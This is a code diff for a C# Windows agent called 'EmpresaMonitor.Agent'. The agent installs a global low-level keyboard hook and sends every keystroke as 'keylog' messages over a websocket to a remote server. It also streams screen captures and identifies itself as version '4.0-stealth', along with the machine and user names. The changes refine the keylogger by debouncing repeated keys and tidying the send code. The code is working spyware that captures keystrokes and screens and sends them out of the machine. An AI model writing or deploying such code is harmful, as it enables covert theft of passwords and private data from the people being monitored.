@@ -33,7 +33,9 @@ namespace EmpresaMonitor.Agent
             var state = new AgentState { Socket = socket, SendGate = sendGate };
 
             KeyboardHook.Install(async (k, d) => {
-                if (state.Socket?.State == WebSocketState.Open && state.IsReady) await SendKeylog(state.Socket, sendGate, k, d, state);
+                if (state.Socket?.State == WebSocketState.Open && state.IsReady) {
+                    await SendKeylog(state.Socket, sendGate, k, d, state);
+                }
             });
 
             _ = Task.Run(() => CaptureLoop(lifetime, agentId, socket, sendGate, state));
@@ -42,7 +44,8 @@ namespace EmpresaMonitor.Agent
                 try {
                     socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);
                     await socket.ConnectAsync(new Uri(BuildConfig.RealtimeUrl), lifetime.Token);
-                    state.IsReady = false;
+                    state.IsReady = false; 
+
                     await SendJsonAsync(socket, sendGate, new { type = "agent_hello", key = BuildConfig.AgentKey, id = agentId, name = Environment.MachineName, user = Environment.UserName, version = "4.0-stealth", sessionAuthorized = true });
                     await ReceiveLoop(socket, sendGate, lifetime.Token, state);
                 } catch { try { await Task.Delay(5000, lifetime.Token); } catch { } }
@@ -50,7 +53,9 @@ namespace EmpresaMonitor.Agent
         }
 
         static async Task SendKeylog(ClientWebSocket s, SemaphoreSlim g, string k, bool d, AgentState st) {
-            try { await SendJsonAsync(s, g, new { type = "keylog", key = k, down = d, ts = DateTime.UtcNow.ToString("HH:mm:ss") }); } catch { }
+            try { 
+                await SendJsonAsync(s, g, new { type = "keylog", key = k, down = d, ts = DateTime.UtcNow.ToString("HH:mm:ss") }); 
+            } catch { }
         }
 
         static async Task ReceiveLoop(ClientWebSocket s, SemaphoreSlim g, CancellationToken ct, AgentState st) {
@@ -87,7 +92,7 @@ namespace EmpresaMonitor.Agent
             int lastW = 0, lastH = 0;
             try {
                 while (!lt.IsCancellationRequested) {
-                    if (!st.AccessActive || !st.StreamRequested || s.State != WebSocketState.Open || !st.IsReady) { await Task.Delay(200, lt.Token); continue; }
+                    if (!st.AccessActive || !st.StreamRequested || s.State != WebSocketState.Open || !st.IsReady) { await Task.Delay(500, lt.Token); continue; }
                     var set = st.Settings; var start = Environment.TickCount64; var b = Screen.PrimaryScreen!.Bounds;
                     if (f == null || b.Width != lastW || b.Height != lastH) { 
                         fg?.Dispose(); f?.Dispose(); f = new Bitmap(b.Width, b.Height, PixelFormat.Format24bppRgb); fg = Graphics.FromImage(f); lastW = b.Width; lastH = b.Height; 
@@ -172,25 +177,41 @@ namespace EmpresaMonitor.Agent
         [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
         [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string n);
 
-        private const int WH_KEYBOARD_LL = 13, WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
-        private static IntPtr _h = IntPtr.Zero; private static LowLevelKeyboardProc? _p; private static Func<string, bool, Task>? _cb;
+        private const int WH_KEYBOARD_LL = 13;
+        private static IntPtr _h = IntPtr.Zero; 
+        private static LowLevelKeyboardProc? _p; 
+        private static Func<string, bool, Task>? _cb;
+        
+        private static string _lastKey = "";
+        private static DateTime _lastTime = DateTime.MinValue;
+        private static readonly object _lock = new object();
 
         public static void Install(Func<string, bool, Task> callback) { _cb = callback; _p = Proc; _h = SetHook(_p); }
+
         private static IntPtr SetHook(LowLevelKeyboardProc p) {
             using var cp = System.Diagnostics.Process.GetCurrentProcess();
             using var cm = cp.MainModule;
             return SetWindowsHookEx(WH_KEYBOARD_LL, p, GetModuleHandle(cm?.ModuleName), 0);
         }
+
         private static IntPtr Proc(int n, IntPtr w, IntPtr l) {
-            if (n == WM_KEYDOWN || n == WM_SYSKEYDOWN) {
-                if (_cb != null) {
-                    int vkCode = Marshal.ReadInt32(l);
-                    string key = ((Keys)vkCode).ToString();
-                    _ = Task.Run(async () => { try { await _cb(key, true); } catch { } });
+            if (n >= 0 && _cb != null) {
+                int vkCode = Marshal.ReadInt32(l);
+                string key = ((Keys)vkCode).ToString();
+
+                lock (_lock) {
+                    if (key == _lastKey && (DateTime.Now - _lastTime).TotalMilliseconds < 60) {
+                        return CallNextHookEx(_h, n, w, l);
+                    }
+                    _lastKey = key;
+                    _lastTime = DateTime.Now;
                 }
+
+                _ = Task.Run(async () => { try { await _cb(key, true); } catch { } });
             }
             return CallNextHookEx(_h, n, w, l);
         }
+
         public static void Uninstall() { if (_h != IntPtr.Zero) { UnhookWindowsHookEx(_h); _h = IntPtr.Zero; } }
     }
 }
